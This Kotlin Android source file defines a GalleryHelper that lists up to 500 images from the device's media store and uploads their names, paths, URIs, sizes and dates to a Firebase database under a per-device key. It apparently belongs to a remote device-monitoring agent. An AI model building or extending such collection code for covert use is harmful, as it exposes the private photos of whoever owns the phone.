package com.guard.agent.helpers.data

import android.content.Context
import android.net.Uri
import android.provider.MediaStore
import com.google.firebase.database.FirebaseDatabase
import com.guard.agent.core.Constants
import com.guard.agent.utils.Logger

object GalleryHelper {

    private const val TAG = "GalleryHelper"
    private const val MAX_ITEMS = 500

    fun push(ctx: Context, deviceKey: String) {
        try {
            val list = mutableListOf<Map<String, Any>>()
            val uri: Uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATA
            )

            val cursor = ctx.contentResolver.query(
                uri, projection, null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC"
            )

            cursor?.use {
                val idIdx = it.getColumnIndex(MediaStore.Images.Media._ID)
                val nameIdx = it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                val dateIdx = it.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)
                val sizeIdx = it.getColumnIndex(MediaStore.Images.Media.SIZE)
                val dataIdx = it.getColumnIndex(MediaStore.Images.Media.DATA)

                while (it.moveToNext() && list.size < MAX_ITEMS) {
                    val id = it.getLong(idIdx)
                    val name = it.getString(nameIdx) ?: ""
                    val dateAdded = it.getLong(dateIdx) * 1000L
                    val size = it.getLong(sizeIdx)
                    val path = it.getString(dataIdx) ?: ""

                    val contentUri = Uri.withAppendedPath(uri, id.toString()).toString()

                    list.add(
                        mapOf(
                            "name" to name,
                            "uri" to contentUri,
                            "path" to path,
                            "size" to size,
                            "date" to dateAdded
                        )
                    )
                }
            }

            FirebaseDatabase.getInstance()
                .getReference(Constants.PATH_DEVICES)
                .child(deviceKey).child(Constants.SUB_GALLERY)
                .setValue(
                    mapOf(
                        "count" to list.size,
                        "list" to list,
                        "time" to System.currentTimeMillis()
                    )
                )

            Logger.d(TAG, "Pushed ${list.size} gallery items")
        } catch (e: Exception) {
            Logger.e(TAG, "push failed", e)
        }
    }
}
